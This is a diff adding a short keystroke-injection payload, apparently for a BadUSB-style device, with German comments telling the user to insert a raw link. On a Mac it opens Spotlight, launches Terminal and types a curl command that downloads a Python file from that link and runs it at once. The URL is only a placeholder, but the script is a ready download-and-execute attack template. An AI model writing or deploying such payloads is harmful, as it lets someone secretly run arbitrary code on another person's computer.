@@ -1,0 +1,12 @@
+layout('de');
+typingSpeed(20, 20);
+
+// KOPIERE DEINEN RAW-LINK HIER REIN:
+var rawUrl = "1234";
+
+// Befehl für den Mac (öffnet Terminal, lädt Code, startet ihn)
+press("GUI SPACE");
+delay(500);
+type("terminal\n");
+delay(2000);
+type("curl -L " + rawUrl + " -o a.py && python3 a.py\n");
